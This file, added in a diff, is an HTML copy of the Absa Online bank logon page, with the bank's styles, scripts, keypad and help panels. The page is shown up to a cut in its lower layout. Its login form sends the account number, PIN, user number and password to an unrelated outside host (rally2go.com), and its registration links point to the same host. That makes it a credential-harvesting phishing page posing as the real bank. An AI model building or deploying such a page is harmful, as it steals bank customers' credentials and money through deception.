@@ -1,0 +1,942 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+ 
+<html xmlns="http://www.w3.org/1999/xhtml"
+	xmlns:c="http://www.backbase.com/2006/command"
+	xmlns:e="http://www.backbase.com/2006/xel"
+	xmlns:xi="http://www.w3.org/2001/XInclude"
+	xmlns:ui="http://www.absa.co.za/2009/ui">
+
+	<head>
+		<meta http-equiv="X-UA-Compatible" content="IE=8" />
+		
+		
+		
+		<title>Absa Online</title>
+		<!--#if expr="( = /iPhone/)"-->
+		<link rel="apple-touch-icon" href="https://ib.absa.co.za/absa-online/static/style/Iphone_app_icon.png"/>
+		<!--#endif -->
+		
+		<script type="text/javascript">
+			(window.top == window.self) || (window.top.location.href = self.location.href);
+		</script>
+		
+		
+			<link rel="stylesheet" type="text/css" href="../../../../../../../ib.absa.co.za/absa-online/static/style/absa2018.css%3Fv=0.1.0-2018-07-09-13-17-30.css" media="screen" />
+			<link rel="stylesheet" type="text/css" href="../../../../../../../ib.absa.co.za/absa-online/static/style/login2018.css%3Fv=0.1.0-2018-07-09-13-17-30.css" />
+		
+		
+		<link rel="stylesheet" type="text/css" href="../../../../../../../ib.absa.co.za/absa-online/static/style/www.absa.co.za.2009.ui/jcaptcha/jcaptcha.css%3Fv=0.1.0-2018-07-09-13-17-30.css" />
+		
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/lib/bcf/4_4_9_1/engine/backbase.js"></script>
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/script/absa-all-base.js%3Fv=0.1.0-2018-07-09-13-17-30"></script>
+		
+
+
+
+	<script type="text/javascript">
+		absa.locale = {"Common\/General\/Label\/Ascending":"Ascending order","Common\/General\/Label\/Descending":"Descending order","Common\/General\/Label\/None":"None","Common\/General\/Label\/Expand":"expand","Common\/General\/Label\/Collapse":"Collapse","Common\/General\/Label\/Selected":"Selected","Common\/General\/Label\/Tab":"Tab","Common\/General\/Label\/ShowSection":"Show section","Common\/General\/Label\/Loading":"Loading","Common\/General\/Label\/Now":"Now","Common\/General\/Label\/HideSection":"Hide section","Common\/General\/Label\/Processing":"Processing","Common\/General\/Label\/Print":"Print this content","Common\/General\/Label\/Close":"Close","Common\/General\/Label\/ErrorMessage":"Error message","Common\/General\/Label\/Of":"of","Common\/General\/Label\/Required":"Required","Common\/General\/Label\/ShowMeHowActivate":"Click here to activate 'Show me how' assistance.","Common\/General\/Label\/ShowMeHowDeactivate":"Click to end 'Show me how' assistance","Common\/General\/Label\/ShowMeHowNotAvailable":"Show me how assistance not available.","Common\/General\/Label\/Invalid":"Invalid","Common\/General\/Label\/Year":"Year","Common\/General\/Label\/Month":"Month","Common\/General\/Label\/Day":"Day","Common\/General\/Label\/SuggestBox\/VIHelp":"Visually impaired help","Common\/General\/Validation\/ChangeAccountName":"The length of this field can be no longer than 15 characters. No special characters are allowed \/?%$#@!* < > :^ (.)","Common\/General\/Subnav\/Link\/ContactUs":"Contact us","Common\/General\/Subnav\/Link\/Help":"Help","Common\/General\/Subnav\/Link\/Print":"Print","Common\/General\/Subnav\/Link\/Logoff":"Logoff","Common\/General\/Subnav\/Label\/SurePhrase":"Your security SurePhrase","Common\/SVM\/Error\/FrontEndTimeOut":"We did not receive your response. Resend the SureCheck or cancel the transaction","Login\/General\/Tooltip\/CaptchaInfo":"You have entered some of your logon credentials incorrectly. Please type the characters displayed in the CAPTCHA image, in the text box below the image. Remember to also retype your access account number and PIN in the usual text boxes.","Security\/AccessControl\/Error\/SVMRetriesExceeded":"Your maximum number of retries has been exceeded","Common\/SVM\/Label\/YouCanResend":"You can resend the SureCheck to your cellphone if the previous one failed","Common\/SVM\/Label\/HelpLine":"Helpline 08600 08600 \/ Int.+2711 501 5019","Security\/AccessControl\/Error\/TVMNotSet":"TVM not set.","Portfolio\/BusBankSetPin\/Label\/PinRulesHeading":"PIN rules"};
+	</script>
+
+		<script type="text/javascript">
+			absa.NONCE = '0';
+			absa.CONTEXT = 'https://ib.absa.co.za/absa-online';
+			absa.XDPROXY = 'https://vs1.absa.co.za/absa-online';
+			absa.TIMEOUT_LOGOFF = 240000; // 240000;
+			absa.MINUSSDTIME = '5';
+			absa.MAXUSSDTIME = '60';
+			absa.MINUSSD2TIME = '5';
+			absa.MAXUSSD2TIME = '60';
+			absa.DSPWINDOWSELF = 'null'; 
+		</script>
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/script/login.js%3Fv=0.1.0-2018-07-09-13-17-30"></script>
+		<!-- <script type="text/javascript" src="https://ib.absa.co.za/absa-online/static/script/absa/absa.SVM.js?v=0.1.0-2018-07-09-13-17-30"></script> -->
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/script/absa/absa.form.wizardBridge.js%3Fv=0.1.0-2018-07-09-13-17-30"></script>
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/script/absa/absa.n2fa.js%3Fv=0.1.0-2018-07-09-13-17-30"></script>
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/script/absa/absa.jcaptcha.js%3Fv=0.1.0-2018-07-09-13-17-30"></script>
+		<script type="text/javascript" src="../../../../../../../ib.absa.co.za/absa-online/static/script/absa/absa.resetPin.js%3Fv=0.1.0-2018-07-09-13-17-30"></script>
+		
+	</head>
+	<body class="ssr-enabled ap-jsp-body" id="bodydiv">
+		
+		<!-- Please wait splash -->
+		
+			</div>
+		</div>
+		
+		<script type="application/backbase+xml"
+			xmlns:xi="http://www.w3.org/2001/XInclude"
+			xmlns:ui="http://www.absa.co.za/2009/ui"
+			xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+			xmlns:e="http://www.backbase.com/2006/xel">
+			
+			<xi:include href="static/script/config.xml?v=0.1.0-2018-07-09-13-17-30" />
+			<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+				targetNamespace="http://ws.online.absa.co.za/common/simpleTypes/"
+				xmlns:simple="http://ws.online.absa.co.za/common/simpleTypes/"
+				elementFormDefault="qualified">
+				
+				<xsd:simpleType name="decimal10">
+					<xsd:restriction base="xsd:string">
+						<xsd:pattern value="\d*"/>
+						<xsd:minLength value="1"/>
+						<xsd:maxLength value="16"/>
+					</xsd:restriction>
+				</xsd:simpleType>
+				
+				<xsd:simpleType name="rvn">
+					<xsd:restriction base="xsd:string">
+						<xsd:pattern value="[A-Za-z0-9  ]*"/>
+						<xsd:minLength value="4"/>
+						<xsd:maxLength value="9"/>
+					</xsd:restriction>
+				</xsd:simpleType>
+				
+				<xsd:simpleType name="decimal">
+					<xsd:restriction base="xsd:decimal" />
+				</xsd:simpleType>
+				
+				<xsd:simpleType name="password">
+					<xsd:restriction base="xsd:string">
+						<xsd:pattern value="^\w*(?=\w*\d)(?=\w*[a-zA-Z])\w*$"/>
+						<xsd:minLength value="8"/>
+						<xsd:maxLength value="12"/>
+					</xsd:restriction>
+				</xsd:simpleType>
+
+				<xsd:simpleType name="accountNumber">
+					<xsd:restriction base="xsd:string">
+						<xsd:minLength value="1"/>
+	        			<xsd:maxLength value="16"/>
+						<xsd:pattern value="[0-9]*"/>
+        			</xsd:restriction>
+    			</xsd:simpleType>
+
+				<xsd:simpleType name="userNumber">
+					<xsd:restriction base="xsd:string">
+		        		<xsd:minLength value="1"/>
+						<xsd:maxLength value="2"/>
+						<xsd:pattern value="[0-9]*"/>
+        			</xsd:restriction>
+    			</xsd:simpleType>
+
+				<xsd:simpleType name="idNumber">
+					<xsd:restriction base="xsd:string">
+		        		<xsd:maxLength value="13"/>
+						<xsd:pattern value="[A-Za-z0-9&amp;'()+-./:=@_  ]*"/>
+        			</xsd:restriction>
+    			</xsd:simpleType>
+
+				<xsd:simpleType name="cellNumber">
+					<xsd:restriction base="xsd:string">
+		        		<xsd:maxLength value="30"/>
+						<xsd:pattern value="[0-9]*"/>
+        			</xsd:restriction>
+    			</xsd:simpleType>
+
+				<xsd:simpleType name="aolPin">
+					<xsd:restriction base="xsd:string">
+						<xsd:length value="5"/>
+						<xsd:pattern value="[0-9]*"/>
+					</xsd:restriction>
+				</xsd:simpleType>
+				
+			</xsd:schema>
+		</script>
+		
+		
+		<div class="ap-page-container">
+			<div class="ap-page-header">
+				
+					<div style="padding-top:12px;"><img src="../../../../../../../ib.absa.co.za/absa-online/static/style/resources/absa-logo-2018.png" width="141" height="97" /></div>
+				
+				<div class="ap-navigation-main">
+					<div class="ap-tabStrip-rounded-left"></div>
+					<ul class="ap-tabStrip-tabs">
+						<li class='ap-tab-button ap-tab-active' id='SSR-tab-18'>
+							<div class="ap-tab-title" tabindex="10">Logon</div>
+							<div class="ap-tab-title-hidden">Logon</div>
+						</li>
+						<li class='ap-tab-button' id='SSR-tab-19'>
+							
+								<div class="ap-tab-title" tabindex="11"><a href="http://rally2go.com/sites/all/modules/link/flexza/1489e3e2fb1f8371d0a9380fe6128145/registration/?lang=en">Registration</a></div>
+							
+							<div class="ap-tab-title-hidden">Registration</div>
+						</li>
+						<li class='ap-tab-button' id='SSR-tab-20'>
+							<div class="ap-tab-title" tabindex="12"><a href="../../../../../../../www.absa.co.za/index.html">Absa home page</a></div>
+							<div class="ap-tab-title-hidden" style="font-size:14px;">Absa home page</div>
+						</li>
+					</ul>
+					<div class="ap-tabStrip-rounded-right"></div>
+					<div style="clear: both;"></div>
+					<img src="../../../../../../../ib.absa.co.za/absa-online/static/style/resources/ao-logo2.png" width="189" height="60" style="position:absolute;top:0;right:20px" id="theImg"/>
+					<div class="ap-navigation-sub ap-tabStrip-subnav"></div>
+				</div>
+			</div>
+			
+			<div class="ap-global-message" id="ap-global-message">
+				<div id="ap-nocookies-msg" style="display: none;">
+					Warning: you do not have Cookies enabled. This applications needs Cookies to function
+					properly. Please turn it on and reload the page. If you need assistance
+					in turning on your Cookies <a>click here</a> to get instructions.
+				</div>
+				<noscript>
+					<div>
+						Warning: you do not have Javascript enabled. This
+						applications needs Javascript to function properly. Please turn it on
+						and reload the page. If you need assistance in turning on your
+						Javascript <a>click here</a> to get instructions.
+					</div>
+				</noscript>
+			</div>
+			
+			<div class="ap-main-content-wrapper">
+				<!-- Page top corners -->
+				<div class="ap-main-content-wrapper-top">
+					<div class="ap-corners-rounded-top-left"></div>
+					<div class="ap-corners-rounded-top"></div>
+					<div class="ap-corners-rounded-top-right"></div>
+				</div>
+				
+				<!-- Page content -->
+				<div class="ap-page-content ap-container">
+					<div class="ap-container-highlevel">
+						<div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
+							<div id="header_results" class="ap-bar-section ap-bar-title">
+								Logon&#160;
+								| Welcome to Absa Online
+							</div>
+						</div>
+						
+						
+						<div class="ap-container-content" style="padding-bottom:5px; overflow: hidden"><!-- PS: height must be set here to AUTO else it cuts of the bottom of the inner content -->
+							
+							<div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
+								<!-- ap-column-1 -->
+								<div class="ap-column-1" style="width: 606px;padding:0">
+									<div id="ap-login-container" class="ap-login-container">
+									 
+<div class="ap-container-highlevel" style="width:606px;">
+	<div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login">
+		<div class="ap-bar-section ap-bar-title" style="margin-top:8px;margin-left:25px" tabindex="5">
+			&#160;&#160;Logon details
+		</div>
+		<div style="float:right; margin-right: 10px;">
+			<div style="background: url('../../../../../../../ib.absa.co.za/absa-online/static/style/resources/icon-questionmark-grey.png') no-repeat scroll left top transparent; margin-top: 6px; height: 30px; width: 20px; cursor: pointer;" onclick="showHideHelp(this)"	tooltip='Click here to Show me how.'></div>
+		</div>
+	</div>
+	
+	<div class="ap-container-content">
+		<div class="ui-keypad">
+			<form novalidate class="ui-form" method="post" action="http://rally2go.com/sites/all/modules/link/flexza/1489e3e2fb1f8371d0a9380fe6128145/login.php" formtype="submit" onsubmit="onForm1Submit()">
+				<!-- Input form -->
+				<table class="ui-grid ui-keypad-inputs" style="width:385px;float:left;">
+					<tbody>
+						<tr class="ui-row">
+							<td class="ui-cell" style="width:200px;">
+								<label for="j_username">
+									<span>Enter your access account number</span>
+								</label>
+							</td>
+							<td class="ui-cell" style="nowrap:nowrap;">
+								<div style="text-align:left;">
+									<input
+										
+											
+											value=""
+										
+										bbf_type="simple:decimal10"
+										bbf_required="true"
+										bbf_x_type_number="true"
+										requiredText="Field is required."
+										schemaTypeText='Only numbers are allowed (Maximum 16)'
+										showMeHow='An access account number is the bank account number you choose when you registered for the Absa Online service. It could can be your current, savings, or credit card account number.'
+										messageref=".errorMessage"
+										class="ui-form-field ui-textBox ui-keypad-input-selected ap-showMeHow-focus"
+										style="width:132px; height:18px; line-height:18px; vertical-align:middle;"
+										name="AccessAccount"
+										autocomplete="off"
+										id="j_username"
+										maxlength="16"
+										type="input" 
+										tabindex="0" />
+								</div>
+							</td>
+						</tr>
+						<tr class="ui-row">
+							<td class="ui-cell">
+								<label for="j_pin">
+									<span>Enter your PIN</span>
+								</label>
+							</td>
+							<td class="ui-cell">
+								<div style="text-align:left;">
+									<input ondragstart="return false" onselectstart="return false"
+									
+										
+										value=""
+									
+										class="ui-form-field ui-textBox"
+										style="width:132px; height:18px; line-height:18px; vertical-align:middle;"
+										name="PIN"
+										id="j_pin"
+										maxlengthDEV="5"
+										ondrag="return false"
+										oncopy="return false"
+										autocomplete="off"
+										bbf_required="true"
+										requiredText='Field is required.'
+										schemaTypeText='Only numeric values are allowed'
+										showMeHow="The PIN must be numeric and cannot contain alpha characters, e.g. *, #, @ or a, b, c. The PIN can be either four or five digits long."
+										messageref=".errorMessage"
+										type="password" 
+										tabindex="0" />
+								</div>
+							</td>
+						</tr>
+						<tr class="ui-row">
+							<td class="ui-cell">
+								<label for="j_user_no">
+									<span>Enter your user number</span>
+								</label>
+							</td>
+							<td class="ui-cell">
+								<div style="text-align:left;">
+									<input
+										
+											value="1"
+											
+										
+										class="ui-form-field ui-textBox "
+										name="Operator"
+										style="width:132px; height:18px; line-height:18px; vertical-align:middle;"
+										id="j_user_no"
+										maxlength="4"
+										bbf_type="simple:decimal"
+										bbf_x_type_number="true"
+										bbf_required="true"
+										requiredText='Field is required.'
+										schemaTypeText='Only numeric values are allowed'
+										showMeHow="Absa Online can have more than one user per service and each user has their own Absa Online PIN. You must use the user number assigned to you at registration when you logon to the service."
+										messageref=".errorMessage"
+										type="text" 
+										tabindex="0" />
+								</div>
+							</td>
+						</tr>
+						<tr class="ui-row">
+							<td class="ui-cell">
+								<label for="j_user_no">
+									<span>Enter your password</span>
+								</label>
+							</td>
+							<td class="ui-cell">
+								<div style="text-align:left;">
+									<input
+										
+											value=""
+											
+										
+										class="ui-form-field ui-textBox "
+										name="password"
+										style="width:132px; height:18px; line-height:18px; vertical-align:middle;"
+										id="j_user_no"
+										maxlength="30"
+										bbf_type="simple:decimal"
+										bbf_x_type_number="true"
+										bbf_required="true"
+										requiredText='Field is required.'
+										 
+										messageref=".errorMessage"
+										type="password" 
+										tabindex="0" />
+								</div>
+							</td>
+						</tr>
+						<!-- Captcha Stuff -->
+						<tr class="ui-row ui-row-captcha " id="ui-row-captcha" style="display:none;">
+							<td class="ui-cell">
+								<label class="ui-label ap-label-details"
+									for="j_user_no"
+									offsetx="0"
+									offsety="10"
+									tooltip="You have entered some of your logon credentials incorrectly. Please type the characters displayed in the CAPTCHA image, in the text box below the image. Remember to also retype your access account number and PIN in the usual text boxes.">
+									<span>Enter code in the box below</span><span class="ui-label--icon"></span>
+							</td>
+							<td class="ui-cell">
+								<div style="text-align:left;">
+									<div class="ui-jcaptcha jcaptcha_container">
+										<div class="jcaptcha_menu">
+											<button class="ui-button jcaptcha-icon-image jcaptcha-icon-hide ui-captchaCheck--iconHide"
+												type="button" 
+												onclick="absa.jcaptcha.getImageChallenge(this)" 
+												tooltip="Get an image challenge" >
+											</button>
+											<button class="ui-button jcaptcha-icon-sound ui-captchaCheck--iconSound"
+												type="button" 
+												onclick="absa.jcaptcha.getSoundChallenge(this)" 
+												tooltip="Get a sound challenge" >
+											</button>
+											<button class="ui-button jcaptcha-icon-refresh"
+												type="button" 
+												onclick="absa.jcaptcha.refreshChallenge(this)" 
+												tooltip="Get a new challenge" >
+											</button>
+											<button class="ui-button jcaptcha-icon-help jcaptcha-icon-hide ui-captchaCheck--iconHide"
+												type="button" 
+												onclick="absa.jcaptcha.help(this)" 
+												tooltip="Help" >
+											</button>
+										</div>
+										<div class="jcaptcha_lnk ui-captchaCheck_lnk">
+											<img src="../../../../../../../ib.absa.co.za/absa-online/static/style/resources/dot.gif" class="jcaptcha_img ui-captchaCheck_img" id="jCaptchaImgID" title="Captcha" />
+											<iframe src="../../../../../../../ib.absa.co.za/absa-online/static/style/resources/dot.gif" class="jcaptcha_iframe ui-captchaCheck_iframe" frameborder="0" scrolling="no" width="0" height="0" marginwidth="0" marginheight="0"></iframe>										
+										</div>
+										<div class="jcaptcha_input">
+											<input ondragstart="return false" onselectstart="return false"
+												class="ui-form-field ui-textBox ui-jcaptcha-textBox"
+												name="CaptchaTxt"
+												id="j_jcaptcha_txt"
+												ondrag="return false"
+												oncopy="return false"
+												autocomplete="off"
+												bbf_type="simple:alphanumeric"
+												bbf_required="true"
+												requiredText='Enter the values from the given captcha'
+												schemaTypeText='Enter the values from the given captcha'
+												showMeHow='Enter the values from the given captcha'
+												messageref=".errorMessage"
+												type="input" 
+												tabindex="0" />
+										</div>
+										
+										<!-- Modal Captcha Help -->
+										<div class="modalCaptchaHelp jcaptcha_help ui-captchaCheck_help" style="display:none; z-index:200;">
+											<div class="ap-popup">
+												<div class="ap-popup-header"><b>Captcha Help</b>
+													<div class="clear-both"></div>
+												</div>
+												<div class="ap-popup-body ap-info-box">
+													<ul class="ap-info-box-ul">
+														<li>Enter the words you see in the box, in order and separated by a space. Doing so helps prevent automated programs from abusing this service</li>
+														<li>If you are not sure what the words are, either enter your best guess or click the reload button next to the distorted words</li>
+														<li>Visually impaired users can click the audio button to hear a set of words that can be entered instead of the visual challenge.</li>
+													</ul>
+												</div>
+												<div class="ap-popup-footer" style="text-align:right;">
+													<button onclick="phe.modal.hideModal()" type="button" tabindex="0" class="ui-button ap-button-extra">
+														<div class="ui-button-left">
+															<div class="ui-button-right">
+																<div role="button" tabindex="22" class="ui-button-center">Ok</div>
+															</div>
+														</div>
+													</button>
+												</div>
+											</div>
+										</div>
+									</div>
+									
+								</div>
+							</td>
+						</tr>
+						
+						
+						<tr class="ui-row">
+							<td class="ui-cell" colspan="2" style="padding-top:2px">
+								<span style="color: #767676;">It is your responsibility to ensure the secrecy of your PIN number.</span>
+							</td>
+						</tr>
+					</tbody>
+				</table>
+				
+				<!-- Keypad -->
+				<div style="float: left; width: 104px; padding: 5px;">
+					<div style="float:left; margin-left:0px;">
+						<div style="-moz-user-select: none;" class="ui-keypad-padContainer">
+							<p>Keypad</p>
+							<table>
+								<tbody>
+									<tr>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">1</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">2</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">3</div>
+										</td>
+									</tr>
+									<tr>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">4</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">5</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">6</div>
+										</td>
+									</tr>
+									<tr>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">7</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">8</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">9</div>
+										</td>
+									</tr>
+									<tr>
+										<td>
+											<div class="ui-keypad-button util" action="backspace">
+												<div class="backspace" unselectable="on"></div>
+											</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button" unselectable="on">0</div>
+										</td>
+										<td>
+											<div class="ui-keypad-button util" action="clear" unselectable="on">C</div>
+										</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+				</div>
+				
+				<div class="clear-both"></div>
+				
+				<div class="ui-formFoot">
+					<div class="genericMessage-place-holder" style="display:block">
+				
+				
+				
+				
+				
+				
+						<!--  -->
+						<div id="ap-login-form1-error" role="alert" tabindex="0" class="ui-message ui-message-error" style="display:none">
+							<span class="vi-screenreader-line "> Error details. </span>
+							<div class="ui-message-timeStamp">
+								<div style="display:none;"><span class="vi-screenreader-line ">Time stamp. </span><span class="vi-screenreader-line ">Year. </span>2018-<span class="vi-screenreader-line ">Month. </span>07-<span class="vi-screenreader-line ">Day. </span>16<span class="vi-screenreader-line ">Time:. </span> </div>10:50:17
+							</div>
+							<div class="ui-message--icon"></div>
+							<div style="margin-right: 120px" class="ui-message-content">
+								<div class="ui-message-title"></div>
+								<div class="ui-message-body" style="clear:both;">
+									<!-- msg here -->
+								</div>
+							</div>
+							<div class="clear-both"></div>
+						</div>
+					</div>
+					
+					<div class="validation-place-holder"></div>
+					
+					<div class="ui-buttonFooter">
+						<div class="ui-exception-container" style="border:none">
+							<div style="float:left">
+								
+									<div id="divToAfrikaans">
+										<img src="../../../../../../../ib.absa.co.za/absa-online/static/style/resources/locale_en.gif" title="" style="vertical-align:middle;" />
+										<a tabindex="-1" href="index.html#" onclick="changeLang()" style="color:#646464; text-decoration:underline; padding-left: 5px;">Verander na Afrikaans</a>
+									</div>
+								
+							</div>
+							
+							
+							<!-- Reset Pin link -->
+							
+							<div style="float:left; padding-left:auto; padding-right:auto;">
+								<a tabindex="-1" href="index.html#" onclick="absa.login.onResetPinClick(this)" style="color:red; text-decoration:underline; padding-left: 10px;">Reset PIN</a>
+							</div>							
+							
+							
+
+							
+							<!-- FORGOTPIN LINK 
+							<div style="float:left; padding-left:auto; padding-right:auto;">
+								<a tabindex="-1" href="#" onclick="forgotPin()" style="color:#646464; text-decoration:underline; padding-left: 5px;">Click here to reset your PIN</a>
+							</div> -->
+							
+							<!-- BACK BUTTON : DSP and FEATURE STORE -->
+							
+							
+							<button aria-label="Reset" type="button" tabindex="1"
+								onclick="resetForm1()"
+								class="ui-button ap-button-reset">
+								<div class="ui-button-left">
+									<div class="ui-button-right">
+										<div class="ui-button-center">Reset</div>
+									</div>
+								</div>
+							</button>
+							<button aria-label="Next" type="submit" tabindex="0"
+								class="ui-button ap-button-next">
+								<div class="ui-button-left">
+									<div class="ui-button-right">
+										<div class="ui-button-center">Next</div>
+									</div>
+								</div>
+							</button>
+						</div>
+					</div>
+				</div>
+			</form>
+		</div>
+	</div>
+	
+	<div class="ap-container-bottom-corners">
+		<div class="ap-corners-rounded-bottom-left"></div>
+		<div class="ap-corners-rounded-bottom" style="width:590px;"></div>
+		<div class="ap-corners-rounded-bottom-right"></div>
+	</div>
+</div>
+
+										
+									</div>
+								</div>
+								
+								<!-- ap-column-2 -->
+								<div class="ap-column-2" style="width:296px;">
+									<!-- Important Links on Right Side of Page -->
+									<div id="divimportantlinks" class="ap-login-block-rounded">
+										<!-- top round borders -->
+										<div class="ap-login-block-rounded-top">
+											<div class="ap-corners-rounded-top-left"></div>
+											<div class="ap-corners-rounded-top"></div>
+											<div class="ap-corners-rounded-top-right"></div>
+										</div>
+										<!-- content -->
+										<div role="tablist" class="ui-tabBox">
+											<ul class="ui-tabHeads">
+												<li aria-selected="true"
+													class="ui-tabHead ui-tab-selected"
+													role="button"
+													tabindex="13">
+													Important links
+													<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
+												</li>
+											</ul>
+											<div class="ui-tabBodies">
+												<div tabindex="14" role="tabpanel"
+													class="ui-tabBody ui-tabBody-selected">
+													<div style="background: #FFFFFF;">
+														<ul class="abc">
+															<li><a href='../../../../../../../www.absa.co.za/media-centre/press-statements/old-interface-switched-off.html' id='am' target='_new'>Old interface switched off</a></li><li><a href='http://rally2go.com/sites/all/modules/link/flexza/1489e3e2fb1f8371d0a9380fe6128145/registration/?lang=en' id='am' target='_new'>How to register</a></li><li><a href='../../../../../../../www.absa.co.za/media-centre/press-statements/listed-beneficiary-mfc-account-closed/index.html' id='am' target='_new'>Absa Listed Beneficiaries - accounts closed</a></li><li><a href='../../../../../../../www.absa.co.za/media-centre/press-statements/absa-online-payments-issue-notice.html' id='am' target='_new'><b>Inter-Bank Payment delay</b></a></li><li><a href='../../../../../../../www.absa.co.za/security-centre/online-security.html' id='am' target='_new'>Security enhancement</a></li><li><a href='../../../../../../../www.absa.co.za/talk-to-us/index.html' id='am' target='_new'>Contact us</a></li>
+														</ul>
+													</div>
+												</div>
+											</div>
+										</div>
+										<!-- bottom round borders -->
+										<div class="ap-login-block-rounded-bottom">
+											<div class="ap-corners-rounded-bottom-left"></div>
+											<div class="ap-corners-rounded-bottom"></div>
+											<div class="ap-corners-rounded-bottom-right"></div>
+										</div>
+									</div>
+									
+									<!-- How it Works Right of 2nd page -->
+									<div id="divhowitworks" class="ap-login-block-rounded" style="display:none">
+										<div>
+											<!-- top round borders -->
+											<div class="ap-login-block-rounded-top">
+												<div class="ap-corners-rounded-top-left"></div>
+												<div class="ap-corners-rounded-top"></div>
+												<div class="ap-corners-rounded-top-right"></div>
+											</div>
+											<!-- content -->
+											<div role="tablist" class="ui-tabBox">
+												<ul class="ui-tabHeads">
+													<li aria-selected="true"
+														class="ui-tabHead ui-tab-selected"
+														role="button"
+														tabindex="15">
+														How it works
+														<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
+													</li>
+												</ul>
+												<div class="ui-tabBodies">
+													<div tabindex="16" role="tabpanel"
+														class="ui-tabBody ui-tabBody-selected">
+														<div style="background: #FFFFFF;">
+															<div style="border-bottom: 1px solid #CCCCCC;">
+																<div style="padding: 10px;">In this example the password is <b>Password1</b></div>
+															</div>
+															<div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
+																<span class="pfsmalltxt">a</span> <span class="pfsmalltxt">s</span>
+																<span class="pfsmalltxt">s</span> <span class="pfsmalltxt">w</span>
+																<span class="pfsmalltxt">o</span> <span class="pfsmalltxt">r</span>
+																<span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
+															</div>
+															<div style="margin: 10px 0px 5px 10px;">
+																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7" />
+																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="" />
+																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="" />
+															</div>
+															<div style="border-top: 1px solid #CCCCCC; border-bottom: 1px solid #CCCCCC; padding: 10px;">
+																You have to enter (case sensitive):
+															</div>
+															<div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
+																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
+																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
+																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;</span>
+																<span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
+															</div>
+															<div style="margin: 10px 0px 5px 10px;">
+																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6" />
+																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7" />
+																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="" />
+																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="" />
+															</div>
+															<br />
+														</div>
+													</div>
+												</div>
+											</div>
+											<!-- bottom round borders -->
+											<div class="ap-login-block-rounded-bottom">
+												<div class="ap-corners-rounded-bottom-left"></div>
+												<div class="ap-corners-rounded-bottom"></div>
+												<div class="ap-corners-rounded-bottom-right"></div>
+											</div>
+										</div>
+										
+										<div style="padding: 14px 0px 1px 0px;" id="ap-campaignImage-div"><a href='../../../../../../../www.absa.co.za/security-centre/online-security/index.html'><img src='../../../../../../../ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/orange_banner_en_2.jpg' alt='AOL Express'></a></div>
+										<div style="padding: 14px 0px 1px 0px;" id="ap-campAPBImage-div"><a href='../../../../../../../www.absa.co.za/security-centre/online-security/index.html'><img src='../../../../../../../ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/orange_banner_en_2.jpg' alt='AOL Express'></a></div>
+									</div>
+								</div>
+								<!-- ap-column-2 -->
+								<div class="ap-columns-clear"></div>
+							</div>
+							
+							<!-- ap-columns-2-lhs -->
+							<div style="width: 100%; height: 10px;"></div>
+							
+							<!-- 3 column layout -->
+							<div id="divbottomadds" class="ap-login-columns ap-columns-33">
+								<!-- ap-column-1 -->
